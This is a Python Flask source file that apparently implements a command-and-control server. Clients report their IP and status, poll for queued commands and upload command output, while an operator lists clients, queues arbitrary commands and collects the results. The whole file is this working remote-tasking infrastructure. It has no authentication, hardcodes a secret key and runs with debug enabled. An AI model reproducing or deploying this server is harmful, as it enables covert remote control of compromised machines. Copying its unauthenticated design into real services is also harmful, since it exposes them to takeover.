from flask import Flask, request, jsonify
import time
import os

app = Flask(__name__)

app.secret_key = 'e116a88b20146059e79872e414c2c770982d1c6a28293774026330084f7b60e6'

CLIENT_STATUS = {}
PENDING_COMMANDS = {}
COMMAND_OUTPUTS = {}

@app.route("/status-check", methods=["POST"])
def status_check():
    data = request.json
    user_id = data.get("user_id")
    if user_id:
        CLIENT_STATUS[user_id] = {"ip": data.get("ip"), "status": data.get("status"), "timestamp": time.time()}
        return jsonify({"message": "Status received"}), 200
    return jsonify({"error": "Missing user_id"}), 400

@app.route("/get-command", methods=["GET"])
def get_command():
    user_id = request.args.get("user_id")
    command = PENDING_COMMANDS.pop(user_id, "none")
    return jsonify({"command": command}), 200

@app.route("/post-output", methods=["POST"])
def post_output():
    data = request.json
    user_id = data.get("user_id")
    if user_id:
        output_entry = {"output": data.get("output"), "timestamp": data.get("timestamp")}
        COMMAND_OUTPUTS.setdefault(user_id, []).append(output_entry)
        return jsonify({"message": "Output received"}), 200
    return jsonify({"error": "Missing user_id"}), 400

@app.route("/list-clients", methods=["GET"])
def list_clients():
    return jsonify(CLIENT_STATUS), 200

@app.route("/send-command", methods=["POST"])
def send_command():
    data = request.json
    user_id = data.get("user_id")
    command = data.get("command")
    if user_id and command:
        PENDING_COMMANDS[user_id] = command
        return jsonify({"message": f"Command '{command}' queued for {user_id}"}), 200
    return jsonify({"error": "Missing user_id or command"}), 400

@app.route("/get-output", methods=["GET"])
def get_output():
    user_id = request.args.get("user_id")
    if user_id:
        outputs = COMMAND_OUTPUTS.pop(user_id, [])
        return jsonify({"outputs": outputs}), 200
    return jsonify({"error": "Missing user_id"}), 400

if __name__ == "__main__":
    app.run(debug=True)
